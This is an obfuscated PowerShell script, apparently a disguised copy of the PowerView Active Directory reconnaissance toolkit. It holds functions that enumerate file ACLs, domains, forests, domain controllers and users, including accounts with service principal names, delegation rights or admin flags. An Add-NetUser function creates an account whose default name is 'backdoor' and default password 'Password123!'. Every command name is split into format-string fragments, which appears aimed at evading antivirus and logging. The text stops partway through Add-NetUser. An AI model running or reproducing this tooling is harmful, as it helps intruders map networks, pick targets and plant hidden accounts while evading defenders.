                &("{1}{3}{0}{2}" -f'W','W','arning','rite-') ('N'+'o '+'proxy'+' '+'settin'+'gs'+' '+'fou'+'n'+'d '+'f'+'or '+"$ComputerName")
            }
        }
        catch {
            &("{2}{0}{3}{1}"-f't','Warning','Wri','e-') ('Error'+' '+'enu'+'mer'+'at'+'ing '+'pro'+'x'+'y '+'set'+'ting'+'s'+' '+'f'+'or '+"$ComputerName")
        }
    }
}


function G`ET`-PathaCl {

    [CmdletBinding()]
    param(
        [Parameter(maNdAToRy=${t`RUE}, ValUefromPIpEliNE=${t`RUe})]
        [string]
        ${pA`Th},

        [Switch]
        ${R`E`cuRsE}
    )

    begin {

        function c`onVErT`-f`ILeR`I`gHT {

            

            [CmdletBinding()]
            param(
                [Int]
                ${F`sr}
            )

            ${ACceS`Sm`A`SK} = @{
              [uint32]("{0}{1}{2}"-f '0x80000','0','00') = ("{1}{2}{0}"-f'ad','Ge','nericRe')
              [uint32]("{0}{2}{1}" -f'0x40','000','000') = ("{2}{1}{0}"-f 'e','rit','GenericW')
              [uint32]("{0}{1}{2}" -f'0x','200000','00') = ("{2}{4}{0}{1}{3}"-f 'er','icExe','Ge','cute','n')
              [uint32]("{2}{0}{1}"-f'100000','00','0x') = ("{2}{0}{1}" -f'ner','icAll','Ge')
              [uint32]("{2}{1}{3}{0}" -f'00000','x0','0','20') = ("{2}{3}{0}{1}"-f'Allow','ed','Maxim','um')
              [uint32]("{1}{2}{0}{3}" -f'00000','0x0','1','0') = ("{1}{0}{3}{4}{2}" -f 'essS','Acc','urity','ys','temSec')
              [uint32]("{0}{1}{2}" -f'0x00100','00','0') = ("{2}{0}{1}" -f 'chroni','ze','Syn')
              [uint32]("{3}{1}{2}{0}" -f '00','00','800','0x0') = ("{3}{1}{0}{2}" -f'eO','t','wner','Wri')
              [uint32]("{0}{2}{1}"-f'0x00','0000','04') = ("{1}{2}{0}" -f 'C','W','riteDA')
              [uint32]("{1}{2}{0}"-f '00','0x000','200') = ("{3}{1}{0}{2}" -f 'adCon','e','trol','R')
              [uint32]("{0}{3}{2}{1}" -f '0x00010','0','0','0') = ("{1}{0}"-f 'ete','Del')
              [uint32]("{2}{1}{0}"-f'0','010','0x0000') = ("{1}{3}{2}{0}"-f'ributes','W','iteAtt','r')
              [uint32]("{1}{3}{0}{2}"-f'8','0','0','x000000') = ("{2}{0}{1}"-f'r','ibutes','ReadAtt')
              [uint32]("{2}{0}{1}" -f'x0000004','0','0') = ("{2}{3}{1}{0}"-f'ild','leteCh','D','e')
              [uint32]("{2}{0}{1}" -f '00','0020','0x00') = ("{1}{2}{0}{3}"-f 'er','Execute','/Trav','se')
              [uint32]("{0}{1}{2}{3}"-f '0','x000000','1','0') = ("{5}{2}{1}{4}{3}{0}{6}" -f'ute','eExt','rit','edAttrib','end','W','s')
              [uint32]("{1}{3}{0}{2}"-f'00','0x000','08','0') = ("{3}{2}{0}{4}{5}{1}"-f'e','butes','eadExtend','R','d','Attri')
              [uint32]("{1}{2}{0}"-f'0000004','0x','0') = ("{0}{2}{1}{3}{4}"-f 'Appe','dData/AddSubd','n','irector','y')
              [uint32]("{0}{1}{2}{3}"-f'0','x0','00000','02') = ("{0}{1}{2}{4}{3}" -f'Wr','iteDat','a','dFile','/Ad')
              [uint32]("{0}{1}{2}"-f'0x0','00000','01') = ("{4}{2}{1}{3}{0}" -f'ry','tDirect','s','o','ReadData/Li')
            }

            ${Si`m`PlePErMI`s`s`IoNs} = @{
              [uint32]("{2}{0}{1}" -f'x1f0','1ff','0') = ("{3}{2}{1}{0}"-f 'ol','Contr','ll','Fu')
              [uint32]("{0}{1}"-f '0x','0301bf') = ("{0}{2}{1}"-f 'Modi','y','f')
              [uint32]("{0}{1}{2}"-f'0x02','00a','9') = ("{1}{0}{2}"-f 'd','ReadAn','Execute')
              [uint32]("{1}{0}{2}"-f'x02019','0','f') = ("{0}{1}{3}{2}"-f 'R','e','ndWrite','adA')
              [uint32]("{1}{0}{2}"-f '00','0x02','89') = ("{0}{1}"-f 'R','ead')
              [uint32]("{2}{1}{0}" -f'6','0011','0x0') = ("{0}{1}" -f 'Wri','te')
            }

            ${PeR`mIS`S`IOns} = @()

            
            ${p`eRmis`sIons} += ${SIMp`LE`Pe`RM`I`ssIOns}."K`EYS" |  &('%') {
                              if ((${f`sr} -band ${_}) -eq ${_}) {
                                ${si`M`p`LEPeRmisSi`ONs}[${_}]
                                ${F`SR} = ${f`sR} -band (-not ${_})
                              }
                            }

            
            ${p`eRmis`S`iONS} += ${a`Cc`EsSmAsk}."KE`YS" |
                            &('?') { ${f`sR} -band ${_} } |
                            &('%') { ${A`cCES`SM`AsK}[${_}] }

            (${peRM`Is`SiO`Ns} | &('?'){${_}}) -join ","
        }
    }

    process {

        try {
            ${a`CL} = &("{2}{0}{1}" -f't','-Acl','Ge') -Path ${pa`Th}

            ${A`Cl}."gE`Ta`C`cEss`RuLES"(${T`RUe},${Tr`UE},[System.Security.Principal.SecurityIdentifier]) | &("{2}{0}{1}" -f'h-Obj','ect','ForEac') {

                ${n`Am`ES} = @()
                if (${_}."iDeNTi`TyREf`e`REN`Ce" -match ("{1}{7}{8}{4}{5}{3}{10}{0}{9}{2}{6}" -f'-[0','^S-1-5','9','-9]','0-9]+-[0-9]+-[','0',']+','-21-','[','-','+')) {
                    ${ObJ`ecT} = &("{0}{2}{1}"-f 'Ge','DObject','t-A') -SID ${_}."iDenTI`T`YrEFE`ReNcE"
                    ${Na`Mes} = @()
                    ${s`ids} = @(${ob`JeCT}."o`BJ`ECT`SID")

                    if (${rEC`Ur`sE} -and (${O`BJE`Ct}."SAm`A`Ccou`NttyPE" -ne ("{0}{2}{1}"-f'80','306368','5'))) {
                        ${SI`DS} += &("{2}{1}{4}{0}{3}"-f 'etGroupMembe','-','Get','r','N') -SID ${ob`jECt}."Ob`je`CTsiD" | &("{1}{0}{2}" -f'j','Select-Ob','ect') -ExpandProperty ("{1}{0}{2}{3}" -f'mb','Me','er','Sid')
                    }

                    ${Si`Ds} | &("{3}{1}{2}{0}" -f 't','o','rEach-Objec','F') {
                        ${nA`mEs} += ,@(${_}, (&("{1}{2}{3}{0}{4}" -f'-SidTo','Conve','r','t','Name') ${_}))
                    }
                }
                else {
                    ${Na`meS} += ,@(${_}."idEntiT`Y`ReFeRE`NCE"."VA`LUe", (&("{1}{4}{2}{0}{3}" -f'm','Conve','Na','e','rt-SidTo') ${_}."I`deNtITyre`Fe`ReNce"."vA`lUE"))
                }

                ForEach(${N`AMe} in ${naM`Es}) {
                    ${O`Ut} = &("{3}{1}{0}{2}"-f 'bje','O','ct','New-') ("{2}{0}{1}" -f 'SObj','ect','P')
                    ${O`Ut} | &("{0}{1}{2}" -f 'Ad','d','-Member') ("{2}{1}{3}{0}"-f 'ty','prop','Note','er') ("{1}{0}"-f'h','Pat') ${Pa`TH}
                    ${O`UT} | &("{2}{1}{0}" -f 'mber','-Me','Add') ("{0}{1}{2}"-f 'Note','p','roperty') ("{5}{3}{1}{0}{4}{2}" -f'h','emRig','s','eSyst','t','Fil') (&("{2}{1}{3}{0}"-f't','leRi','Convert-Fi','gh') -FSR ${_}."FI`Les`YstE`mRiGHtS"."V`AlUE__")
                    ${o`Ut} | &("{2}{1}{0}" -f 'ember','dd-M','A') ("{2}{1}{0}" -f 'rty','prope','Note') ("{0}{1}{5}{4}{3}{2}" -f 'Ident','i','ence','Refer','y','t') ${N`AMe}[1]
                    ${O`Ut} | &("{0}{2}{1}"-f 'Add-M','mber','e') ("{2}{0}{1}" -f 'pr','operty','Note') ("{1}{2}{0}" -f'titySID','Ide','n') ${na`ME}[0]
                    ${O`Ut} | &("{2}{1}{0}"-f 'mber','Me','Add-') ("{0}{1}{2}" -f'Not','eprop','erty') ("{1}{2}{3}{0}"-f'e','AccessC','ontrol','Typ') ${_}."ACCES`ScontrO`Lt`YPE"
                    ${O`Ut}
                }
            }
        }
        catch {
            &("{3}{1}{2}{0}" -f 'ng','n','i','Write-War') ${_}
        }
    }
}


function g`ET-`NAmE`Fi`ELD {
    
    
    
    [CmdletBinding()]
    param(
        [Parameter(mANdATory=${t`RuE},VaLUefROmpipELiNe=${t`Rue})]
        ${O`Bje`Ct}
    )
    process {
        if(${O`BJEcT}) {
            if ( [bool](${o`BJecT}."p`S`objecT"."pRop`Ert`IES"."n`Ame" -match ("{1}{2}{0}" -f'e','dns','hostnam')) ) {
                
                ${o`BJ`ECt}."dn`s`HOSTNamE"
            }
            elseif ( [bool](${oBjE`cT}."P`sOBjE`CT"."PRop`e`RTieS"."n`AmE" -match ("{0}{1}"-f'n','ame')) ) {
                
                ${o`BJect}."NA`mE"
            }
            else {
                
                ${obJ`ect}
            }
        }
        else {
            return ${n`Ull}
        }
    }
}


function COnV`e`Rt-lDapP`RoperTY {
    
    param(
        [Parameter(ManDAtORy=${t`Rue},VaLuefrOmpIpELine=${T`RUe})]
        [ValidateNotNullOrEmpty()]
        ${p`Ro`p`ErtIes}
    )

    ${oBJe`c`TP`ROP`ErtiEs} = @{}

    ${P`RoPERti`eS}."pRoPERtyNA`M`es" | &("{3}{2}{1}{0}" -f 'ct','ach-Obje','orE','F') {
        if ((${_} -eq ("{1}{0}{2}" -f'bjectsi','o','d')) -or (${_} -eq ("{1}{2}{0}" -f 'ry','s','idhisto'))) {
            
            ${O`B`jE`cTPro`peRt`Ies}[${_}] = (&("{2}{0}{1}"-f'jec','t','New-Ob') ("{1}{5}{7}{0}{8}{6}{3}{4}{2}"-f'rity','Syste','ecurityIdentifier','ipal','.S','m.Sec','inc','u','.Pr')(${PRopeR`T`iES}[${_}][0],0))."v`ALue"
        }
        elseif(${_} -eq ("{1}{2}{0}" -f'ctguid','obj','e')) {
            
            ${ob`je`cTp`RO`pE`RtiEs}[${_}] = (&("{1}{3}{2}{0}"-f'ct','N','w-Obje','e') ("{1}{0}"-f 'd','Gui') (,${PRo`pER`T`IES}[${_}][0]))."G`UId"
        }
        elseif( (${_} -eq ("{2}{0}{3}{1}"-f 'stl','gon','la','o')) -or (${_} -eq ("{2}{0}{3}{1}"-f'stlogo','estamp','la','ntim')) -or (${_} -eq ("{3}{0}{2}{1}"-f'wdl','et','asts','p')) -or (${_} -eq ("{0}{1}{2}" -f'la','st','logoff')) -or (${_} -eq ("{1}{2}{0}" -f 'ime','badP','asswordT')) ) {
            
            if (${pRoPer`T`iES}[${_}][0] -is [System.MarshalByRefObject]) {
                
                ${tE`mp} = ${p`ROPeRt`ies}[${_}][0]
                [Int32]${H`IGH} = ${T`emp}.("{2}{0}{1}"-f'etT','ype','G').Invoke().("{3}{2}{1}{0}"-f'er','mb','e','InvokeM').Invoke(("{1}{2}{0}" -f 't','High','Par'),  ${BEW`9`TP}::"Ge`T`PROp`erty", ${Nu`LL}, ${T`Emp}, ${nu`Ll})
                [Int32]${L`OW}  = ${T`Emp}.("{1}{2}{0}" -f 'ype','Get','T').Invoke().("{2}{1}{0}{3}"-f 'e','nvokeM','I','mber').Invoke(("{1}{0}" -f'art','LowP'),    ( &("{2}{1}{0}"-f'iTem','HIlD','C') ("Vari"+"abLE:"+"Bew9tp")  ).ValuE::"G`eTPro`pE`RTy", ${nU`ll}, ${t`EmP}, ${n`Ull})
                ${obJEC`TPRo`P`eRTIES}[${_}] = ( ${5M`BI}::"FR`oMFiLE`Ti`mE"([Int64]("0x{0:x8}{1:x8}" -f ${hi`Gh}, ${L`oW})))
            }
            else {
                ${oBJE`ctpRO`pe`RTiES}[${_}] = (  ( &("{0}{2}{1}" -f'VA','blE','ria') ('5Mb'+'i') -VAlUe  )::"F`R`OM`FILeTimE"((${PR`opERtI`Es}[${_}][0])))
            }
        }
        elseif(${pR`O`P`ERTIeS}[${_}][0] -is [System.MarshalByRefObject]) {
            
            ${P`ROP} = ${PRope`RT`IeS}[${_}]
            try {
                ${t`EMP} = ${Pr`oP}[${_}][0]
                &("{2}{1}{0}{3}" -f 'rbos','ite-Ve','Wr','e') ${_}
                [Int32]${hI`gh} = ${Te`mp}.("{1}{0}" -f 'Type','Get').Invoke().("{2}{1}{0}"-f 'ember','okeM','Inv').Invoke(("{2}{1}{0}" -f 'rt','a','HighP'),  ( &("{0}{2}{1}"-f 'VAR','e','IabL')  ('BEW9t'+'p') ).VALUe::"ge`TPr`OpE`RtY", ${NU`LL}, ${t`EmP}, ${Nu`lL})
                [Int32]${L`Ow}  = ${T`EMP}.("{0}{1}"-f 'Ge','tType').Invoke().("{2}{0}{1}"-f 'M','ember','Invoke').Invoke(("{1}{0}" -f't','LowPar'),    ${be`W9`Tp}::"gEt`pRop`e`RTy", ${nU`Ll}, ${T`emp}, ${nu`ll})
                ${obJ`EcT`propeR`TiES}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${h`Igh}, ${l`Ow})
            }
            catch {
                ${O`B`jeC`TpRO`PeRtieS}[${_}] = ${P`RoP}[${_}]
            }
        }
        elseif(${PrOp`eRT`ies}[${_}]."co`UNT" -eq 1) {
            ${oBJ`e`cTPROpe`RTIES}[${_}] = ${prOPE`R`T`ies}[${_}][0]
        }
        else {
            ${o`B`JeCtPR`oPER`T`IES}[${_}] = ${proPe`R`Ti`eS}[${_}]
        }
    }

    &("{1}{0}{2}" -f'w-O','Ne','bject') -TypeName ("{0}{1}{2}" -f'PSO','b','ject') -Property ${OBJ`ect`prO`peR`TIeS}
}









function g`et-D`Oma`inSE`A`RchEr {


    [CmdletBinding()]
    param(
        [String]
        ${D`OmA`IN},

        [String]
        ${dOmAinco`N`Tro`llEr},

        [String]
        ${a`DSp`ATh},

        [String]
        ${A`d`sPreFiX},

        [ValidateRange(1,10000)] 
        [Int]
        ${p`A`GESIZe} = 200
    )

    if(!${dO`ma`iN}) {
        ${d`OmAiN} = (&("{2}{0}{3}{1}{4}" -f'et','tD','G','-Ne','omain'))."Na`me"
    }
    else {
        if(!${dOMA`inCO`NTROl`L`er}) {
            try {
                
                
                ${D`OmaINc`o`NTr`OL`leR} = ((&("{0}{1}{3}{2}" -f'Get-','Net','main','Do'))."PD`cROlE`o`wneR")."NA`me"
            }
            catch {
                throw ("{12}{10}{8}{7}{0}{13}{17}{4}{2}{15}{9}{11}{6}{3}{16}{1}{5}{14}" -f'her: Err','ent ','triev','r','e','doma','fo','earc','inS','g P','-Doma','DC ','Get','or in','in','in',' curr',' r')
            }
        }
    }

    ${Sea`RChSt`RI`Ng} = ("{0}{1}"-f 'L','DAP://')

    if(${dOm`AIncONtR`O`lLeR}) {
        ${s`eArCH`stR`Ing} += ${d`OMAINcO`NTro`lLeR} + "/"
    }
    if(${AdS`Pref`Ix}) {
        ${Se`A`Rchst`RING} += ${Ad`SPre`FiX} + ","
    }

    if(${Ads`PA`Th}) {
        if(${aDSp`A`TH} -like ("{1}{0}" -f'://*','GC')) {
            
            ${DI`sTingUiS`hED`NA`ME} = ${aD`spa`Th}
            ${seA`R`Ch`S`TriNG} = ""
        }
        else {
            if(${ad`SPAth} -like ("{0}{1}{2}"-f'L','DAP','://*')) {
                ${ADSP`A`TH} = ${A`Ds`patH}.("{2}{1}{0}" -f 'tring','bs','Su').Invoke(7)
            }
            ${DiST`I`N`GuI`sHedna`me} = ${a`Dsp`ATh}
        }
    }
    else {
        ${DiS`Tin`gui`shEDNAMe} = "DC=$($Domain.Replace('.', ',DC='))"
    }

    ${sear`C`hsT`RIng} += ${D`IST`IN`GuishednA`Me}
    &("{1}{2}{0}" -f '-Verbose','Wr','ite') ('G'+'et-Dom'+'ainS'+'ear'+'cher '+'sear'+'ch'+' '+'string'+': '+"$SearchString")

    ${Sea`RC`heR} = &("{0}{3}{1}{2}" -f 'N','w-O','bject','e') ("{10}{8}{1}{5}{6}{0}{4}{7}{9}{3}{2}"-f 'rvices.D','stem.Dir','her','c','irect','ectoryS','e','o','y','rySear','S')([ADSI]${sE`ARCH`sTRiNG})
    ${sEA`R`c`HeR}."Pa`G`esIze" = ${PaGe`Size}
    ${sEAr`C`Her}
}


function gEt-neTd`O`m`AiN {


    [CmdletBinding()]
    param(
        [Parameter(ValueFrOMpIpeliNe=${t`RUe})]
        [String]
        ${D`oma`IN}
    )

    process {
        if(${D`OmAin}) {
            ${do`maInCoNt`exT} = &("{1}{0}{2}"-f 'ec','New-Obj','t') ("{10}{6}{3}{0}{12}{2}{9}{5}{14}{7}{4}{13}{11}{1}{8}" -f'yServi','Con','s','tor','ir','iveDirec','rec','ry.D','text','.Act','System.Di','y','ce','ector','to')(("{1}{2}{0}"-f 'n','D','omai'), ${doma`In})
            try {
                 (  &("{2}{1}{0}" -f 'E','riabL','get-vA')  Au0WQ  -VA)::("{1}{2}{0}"-f 'omain','Get','D').Invoke(${D`omA`iN`CO`NtExT})
            }
            catch {
                &("{3}{2}{1}{0}"-f 'ning','War','ite-','Wr') ('Th'+'e '+'spec'+'if'+'ied '+'doma'+'i'+'n '+"$Domain "+'does'+' '+'not'+' '+'e'+'xist, '+'co'+'uld '+'not'+' '+'b'+'e '+'co'+'ntacte'+'d,'+' '+'or'+' '+'th'+'ere '+(('isndR'+'A'+'t ')-creplaCE  'dRA',[char]39)+'an'+' '+'exi'+'sti'+'ng '+'tr'+'us'+'t.')
                ${Nu`ll}
            }
        }
        else {
              ${a`U0`wq}::("{4}{0}{2}{3}{1}" -f'r','ain','r','entDom','GetCu').Invoke()
        }
    }
}


function GEt-n`e`TFoReST {


    [CmdletBinding()]
    param(
        [Parameter(VALuEFroMpIpELIne=${T`Rue})]
        [String]
        ${foRe`ST}
    )

    process {
        if(${f`OrE`St}) {
            ${Fo`REs`T`cONTExt} = &("{2}{0}{1}"-f'O','bject','New-') ("{4}{5}{7}{2}{6}{3}{8}{1}{0}{10}{9}{11}{12}" -f'e','Dir','r','eDire','Sy','st','yServices.Activ','em.Directo','ctory.','r','cto','yC','ontext')(("{1}{2}{0}"-f't','Fo','res'), ${f`o`ReSt})
            try {
                ${For`e`sT`Obj`ECT} =   ${X`4`yGJB}::("{1}{0}"-f 'tForest','Ge').Invoke(${ForE`STc`On`TEXT})
            }
            catch {
                &("{1}{0}{2}"-f 'te-Deb','Wri','ug') ('The'+' '+'spe'+'c'+'ified '+'f'+'ore'+'st '+"$Forest "+'do'+'es '+'not'+' '+'exi'+'st, '+'cou'+'ld '+'not'+' '+'b'+'e '+'co'+'nta'+'c'+'ted, '+'o'+'r '+'the'+'re '+(('i'+'sncrat'+' ') -rEplAcE  ([ChaR]99+[ChaR]114+[ChaR]97),[ChaR]39)+'an'+' '+'ex'+'isting '+'t'+'rust.')
                ${nU`LL}
            }
        }
        else {
            
            ${Fo`Res`ToBJeCT} =  (&("{0}{2}{1}" -f'ge','m','T-iTE') vAriABLe:X4ygjB ).ValuE::("{3}{1}{2}{0}" -f'est','Current','For','Get').Invoke()
        }

        if(${forE`sTo`Bj`Ect}) {
            
            ${F`OrEsT`SiD} = (&("{1}{0}{3}{2}"-f 'e','N','Object','w-') ("{4}{1}{0}{2}{3}{5}" -f 'rity.','em.Secu','Principal.NTAcco','un','Syst','t')(${fOReSToB`Je`Ct}."rO`O`TdoMAin",("{1}{0}"-f 'gt','krbt')))."tR`ANsl`AtE"([System.Security.Principal.SecurityIdentifier])."V`ALuE"
            ${par`TS} = ${f`O`RestsiD} -Split "-"
            ${fo`R`e`stSID} = ${par`Ts}[0..$(${PAR`TS}."LEng`TH"-2)] -join "-"
            ${fO`ReStOb`ject} | &("{0}{2}{1}"-f'Add','ember','-M') ("{0}{2}{1}{3}" -f'No','p','tePro','erty') ("{2}{0}{1}{3}"-f'Dom','ainS','Root','id') ${foRe`St`siD}
            ${fOREsTO`BJE`CT}
        }
    }
}


function GET-NETF`oREs`T`DOMA`IN {


    [CmdletBinding()]
    param(
        [Parameter(vALuefRoMpipeLiNE=${Tr`UE})]
        [String]
        ${f`O`ReST},

        [String]
        ${DO`M`Ain}
    )

    process {
        if(${dOM`A`IN}) {
            
            if(${Doma`IN}.("{2}{1}{0}"-f 'ns','ntai','Co').Invoke('*')) {
                (&("{0}{2}{1}{3}" -f 'Ge','s','t-NetFore','t') -Forest ${f`O`REST})."D`omai`NS" | &("{2}{1}{0}" -f 'bject','-O','Where') {${_}."n`AmE" -like ${dom`AIN}}
            }
            else {
                
                (&("{4}{0}{2}{1}{3}" -f'Net','ore','F','st','Get-') -Forest ${FOrE`St})."d`OmA`InS" | &("{0}{1}{2}{3}"-f'Wh','er','e-Obj','ect') {${_}."N`AMe".("{0}{2}{1}"-f'To','r','Lowe').Invoke() -eq ${d`O`mAin}.("{2}{1}{0}" -f'r','oLowe','T').Invoke()}
            }
        }
        else {
            
            ${Fo`R`EstoBJ`ECT} = &("{4}{0}{2}{1}{3}"-f'e','ores','tF','t','Get-N') -Forest ${For`est}
            if(${f`oreStO`B`J`ECt}) {
                ${fo`R`e`stoB`Ject}."DoMA`INS"
            }
        }
    }
}


function GEt-`NETForesTCaTa`l`Og {


    [CmdletBinding()]
    param(
        [Parameter(VALueFRoMPipeLiNE=${tR`Ue})]
        [String]
        ${F`orEst}
    )

    process {
        ${fo`R`EsTob`j`ect} = &("{1}{2}{3}{4}{0}"-f'est','Get-','N','etF','or') -Forest ${F`ORe`ST}
        if(${fore`sT`OBJE`cT}) {
            ${F`OrE`SToBjEcT}.("{0}{2}{3}{1}{4}"-f 'Fi','obalCa','n','dAllGl','talogs').Invoke()
        }
    }
}


function geT-nEt`Do`MA`I`NConT`RoLL`eR {


    [CmdletBinding()]
    param(
        [Parameter(vaLueFrOMpIpELiNe=${Tr`UE})]
        [String]
        ${do`MAiN},

        [String]
        ${DOm`AI`NcONtrO`lLEr},

        [Switch]
        ${L`daP}
    )

    process {
        if(${Ld`Ap} -or ${Do`mai`NCoNT`Ro`lLeR}) {
            
            &("{0}{3}{2}{1}"-f 'Get','er','Comput','-Net') -Domain ${Dom`AiN} -DomainController ${Dom`AIN`cO`N`T`ROlleR} -FullData -Filter ("{8}{4}{1}{9}{6}{2}{0}{11}{14}{5}{3}{7}{13}{12}{10}"-f ':','s','l','56.','u','40.1135','ccountContro','1.','(','erA','03:=8192)','1.','8','4.','2.8')
        }
        else {
            ${fO`UNdd`OmAiN} = &("{1}{2}{0}" -f'ain','Get-N','etDom') -Domain ${do`MaiN}
            
            if(${Fo`U`NDDom`AIn}) {
                ${fO`UndD`o`maIN}."DoMainC`oN`TROLle`Rs"
            }
        }
    }
}








function gE`T-N`e`TusER {


    [CmdletBinding()]
    param(
        [Parameter(valuEfRoMPIPELInE=${Tr`UE})]
        [String]
        ${Use`Rn`Ame},

        [String]
        ${d`o`maIn},

        [String]
        ${DO`M`Ai`Nc`Ontroll`eR},

        [String]
        ${A`DS`paTh},

        [String]
        ${f`iL`Ter},

        [Switch]
        ${s`Pn},

        [Switch]
        ${AD`m`iNcouNt},

        [Switch]
        ${u`NcOnstrAi`N`ed},

        [Switch]
        ${ALlOw`DEl`E`G`A`Tion},

        [ValidateRange(1,10000)] 
        [Int]
        ${pa`ges`IZe} = 200
    )

    begin {
        
        ${USE`RsEa`RchER} = &("{4}{1}{3}{0}{2}"-f 'h','S','er','earc','Get-Domain') -Domain ${do`MaIn} -ADSpath ${a`dspATh} -DomainController ${dom`A`INcO`NTR`olL`eR} -PageSize ${page`s`IZe}
    }

    process {
        if(${usER`SEAr`CHeR}) {

            
            if(${U`N`cOnstrA`INeD}) {
                &("{1}{3}{2}{0}"-f '-Verbose','W','e','rit') ("{5}{3}{0}{2}{4}{1}{6}"-f'o','trai','r unco','king f','ns','Chec','ned delegation')
                ${fIl`TeR} += (("{4}{14}{6}{12}{3}{7}{9}{0}{10}{11}{13}{8}{5}{1}{2}"-f'40.113','24','288)','ntro','(userAcco','4.803:=5','nt','l:1','.1.','.2.8','5','5','Co','6','u'))
            }
            if(${aLl`owDEleGA`TI`oN}) {
                &("{4}{0}{3}{2}{1}" -f 'i','ose','b','te-Ver','Wr') ("{2}{1}{3}{10}{5}{4}{6}{0}{9}{8}{7}"-f 'n b','he','C','c','r users who','fo',' ca','egated','el','e d','king ')
                
                ${fIlt`ER} += (("{3}{10}{8}{9}{7}{5}{6}{0}{2}{1}{4}" -f 'ountC','.840.113556.1.4.803','ontrol:1.2','(!',':=1048574))','Ac','c','er','u','s','('))
            }
            if(${A`Dm`iNC`ouNt}) {
                &("{4}{1}{3}{0}{2}" -f 'os','-V','e','erb','Write') ("{2}{7}{3}{4}{5}{1}{0}{6}"-f 'nt','minCou','C','ck','ing fo','r ad','=1','he')
                ${FI`l`TEr} += (("{2}{3}{0}{1}"-f'count','=1)','(ad','min'))
            }

            
            if(${Us`Er`NAmE}) {
                
                ${U`SeR`SE`ARCHeR}."f`IltER"="(&(samAccountType=805306368)(samAccountName=$UserName)$Filter)"
            }
            elseif(${S`pN}) {
                ${userSe`Ar`ch`eR}."FiL`TEr"="(&(samAccountType=805306368)(servicePrincipalName=*)$Filter)"
            }
            else {
                
                ${us`eRsEAr`chER}."Fil`TeR"="(&(samAccountType=805306368)$Filter)"
            }

            ${uSE`R`SEARcher}.("{1}{0}"-f 'dAll','Fin').Invoke() | &("{2}{3}{0}{1}"-f '-','Object','Whe','re') {${_}} | &("{3}{0}{2}{1}"-f 'ach-Ob','ct','je','ForE') {
                
                &("{0}{2}{4}{3}{1}"-f 'Convert','y','-','opert','LDAPPr') -Properties ${_}."PR`O`perTIEs"
            }
        }
    }
}


function add`-`NETuSeR {


    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        ${USE`Rna`ME} = ("{2}{0}{1}"-f'doo','r','back'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${P`ASsw`Ord} = ("{0}{2}{1}"-f'P','ssword123!','a'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${G`ROUpNa`ME},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f'ost','H','Name'})]
        [String]
        ${C`OMpU`TEr`Na`mE} = ("{0}{1}{2}" -f'local','ho','st'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`o`maiN}
    )

    if (${d`OmaiN}) {

        ${d`o`maINObJE`CT} = &("{2}{3}{0}{1}" -f'tDom','ain','Get-N','e') -Domain ${DOmA`in}
        if(-not ${dO`Main`ob`jecT}) {
            &("{1}{2}{0}"-f'-Warning','Wr','ite') ('Erro'+'r '+'i'+'n '+'g'+'rabbin'+'g '+"$Domain "+'obje'+'ct')
            return ${NU`ll}
        }

        
        &("{0}{1}"-f'Add-T','ype') -AssemblyName ("{5}{1}{7}{8}{2}{4}{9}{3}{10}{6}{0}"-f't','ste','e','unt','rvices.','Sy','n','m.Di','rectoryS','Acco','Manageme')

        
        
        ${coNt`Ext} = &("{1}{2}{3}{0}"-f'ject','Ne','w','-Ob') -TypeName ("{2}{3}{1}{0}{4}{5}{14}{11}{8}{7}{13}{10}{12}{9}{6}" -f'irector','tem.D','Sy','s','yServices.Acc','oun','xt','t','nagemen','te','al','Ma','Con','.Princip','t') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"DOM`AiN"), ${d`o`mAiNObje`ct}

        
        ${uS`er} = &("{0}{2}{1}"-f 'Ne','bject','w-O') -TypeName ("{3}{10}{8}{0}{5}{7}{1}{6}{4}{9}{2}"-f'.DirectoryServic','tManagem','l','Syst','ncip','es.Acc','ent.UserPri','oun','m','a','e') -ArgumentList ${C`onteXt}

        
        ${uS`er}."N`AMe" = ${US`er`NAme}
        ${U`seR}."S`Ama`ccOUn`TnAME" = ${use`Rna`Me}
        ${uS`er}."p`AS`sWo`Rd`NOT`ReQUIrED" = ${fAL`se}
        ${U`ser}.("{0}{2}{1}"-f'Se','word','tPass').Invoke(${P`AsSW`Ord})
        ${u`Ser}."enAB`led" = ${t`RuE}

        &("{3}{2}{1}{0}"-f'e','os','erb','Write-V') ('Crea'+'t'+'ing '+'u'+'ser '+"$UserName "+'t'+'o '+'with'+' '+'pa'+'ssw'+'ord '+"'$Password' "+'i'+'n '+'do'+'ma'+'in '+"$Domain")

        try {
            
            ${u`Ser}.("{0}{1}" -f 'Sav','e').Invoke()
            ('['+'*] '+'User'+' '+"$UserName "+'su'+'ccess'+'ful'+'ly '+'cr'+'eat'+'ed '+'in'+' '+'dom'+'ain '+"$Domain")
        }
        catch {
            &("{1}{0}{2}" -f 'e-Warni','Writ','ng') ("{2}{1}{4}{0}{3}"-f'st','dy ex','[!] User alrea','s!','i')
            return
        }
    }
    else {
        
        &("{1}{2}{0}"-f 'erbose','Write-','V') ('C'+'rea'+'ting '+'u'+'ser '+"$UserName "+'to'+' '+'w'+'ith '+'p'+'as'+'sword '+"'$Password' "+'o'+'n '+"$ComputerName")

        
        ${Ob`j`OU} = [ADSI]"WinNT://$ComputerName"
        ${Ob`J`USer} = ${o`BJOu}.("{1}{0}"-f'e','Creat').Invoke(("{0}{1}" -f'U','ser'), ${uSe`RNA`ME})
        ${ObJu`ser}.("{2}{1}{0}" -f 'sword','etPas','S').Invoke(${P`Ass`woRd})

        
        try {
            ${Nu`ll} = ${ob`J`USEr}.("{2}{0}{1}" -f 'f','o','SetIn').Invoke()
            ('[*'+'] '+'Us'+'er '+"$UserName "+'su'+'ccessf'+'ull'+'y '+'creat'+'ed '+'o'+'n '+'ho'+'st '+"$ComputerName")
        }
        catch {
            &("{0}{2}{1}" -f'W','te-Warning','ri') ("{6}{4}{2}{3}{7}{5}{8}{0}{1}"-f's','!','c','ount a',' Ac',' exis','[!]','lready','t')
            return
        }
    }

    
    if (${G`ROU`pn`AME}) {
        
        if (${do`Ma`iN}) {
            &("{0}{2}{1}{3}{4}" -f 'Add-NetG','p','rou','U','ser') -UserName ${u`seRn`AMe} -GroupName ${Gr`ouPN`A`me} -Domain ${DOm`AiN}
